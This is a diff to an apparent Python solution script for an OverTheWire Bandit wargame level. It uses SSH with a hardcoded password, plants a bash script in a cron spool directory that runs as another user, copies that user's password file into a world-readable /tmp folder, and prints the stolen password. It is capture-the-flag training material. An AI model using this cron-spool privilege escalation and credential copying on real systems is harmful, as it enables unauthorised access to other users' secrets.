@@ -1,9 +1,11 @@
 import os
 import sys
-sys.insert(1, os.path.dirname(os.path.realpath(__file__)) + '/..')
+sys.path.insert(1, os.path.dirname(os.path.realpath(__file__)) + '/..')
 
 import paramiko
 import utils
+import time
+from tqdm import tqdm
 
 USERNAME = 'bandit23'
 PASSWORD = 'jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n'
@@ -15,6 +17,8 @@ print('connecting...\n')
 client.connect(hostname=utils.ADDRESS, port=utils.PORT, username=USERNAME, password=PASSWORD)
 
 print('ls -l /etc/cron.d/')
+_, stdout, _ = client.exec_command('ls -l /etc/cron.d/')
+utils.print_stdout(stdout)
 
 print('cat /etc/cron.d/cronjob_bandit24')
 # note that according to https://crontab.guru/#*_*_*_*_*
@@ -22,8 +26,12 @@ print('cat /etc/cron.d/cronjob_bandit24')
 * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
 """
 # the cronjob is executed every minute
+_, stdout, _ = client.exec_command('cat /etc/cron.d/cronjob_bandit24')
+utils.print_stdout(stdout)
 
 print('cat /usr/bin/cronjob_bandit24.sh')
+_, stdout, _ = client.exec_command('cat /usr/bin/cronjob_bandit24.sh')
+utils.print_stdout(stdout)
 
 # firstly, 
 # cd /var/spool/$myname
@@ -49,5 +57,42 @@ fi
 """
 # it will execute each file inside of it, except current directory (.) and parent directory(..)
 # if the owner of the file is bandit23, it will execute it for 60 seconds
+
+# since we want to read bandit24 password in /etc/bandit_pass/bandit24
+FOLDER_NAME = "temporaryfolderforbandit24"
+BASH_SCRIPT = f"""#!/bin/bash
+# create a temporary folder for storing the password file
+mkdir /tmp/{FOLDER_NAME}
+# allow anyone to access the folder
+chmod 777 /tmp/{FOLDER_NAME}
+# copy the password file and allow anyone to access it
+cp /etc/bandit_pass/bandit24 /tmp/{FOLDER_NAME}/bandit24
+chmod 777 /tmp/{FOLDER_NAME}/bandit24"""
+
+# write the script and allow anyone to execute it
+_, stdout, _ = client.exec_command(f'echo -e "{BASH_SCRIPT}" | tee /var/spool/bandit24/{FOLDER_NAME} && chmod 777 /var/spool/bandit24/{FOLDER_NAME}')
+utils.print_stdout(stdout)
+
+# wait for the cronjob to be executed
+# 75 seconds because the cronjob is executed every 60s and we need to give it extra time for it to be executed
+SLEEP_TIME = 75
+print(f'sleeping for {SLEEP_TIME}s...')
+for i in tqdm(range(SLEEP_TIME)):
+    time.sleep(1)
+print()
+
+# read the password file
+print(f'cat /tmp/{FOLDER_NAME}/bandit24')
+_, stdout, _ = client.exec_command(f'cat /tmp/{FOLDER_NAME}/bandit24')
+stdout = stdout.readlines()
+utils.print_stdout(stdout)
+password = utils.get_password(stdout)
+
+# bandit24 password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+print(f"bandit24 password: {password}\n")
+
+# clean up
+print('deleting the temporary folder...')
+client.exec_command(f'rm -r /tmp/{FOLDER_NAME}')
 
 client.close()
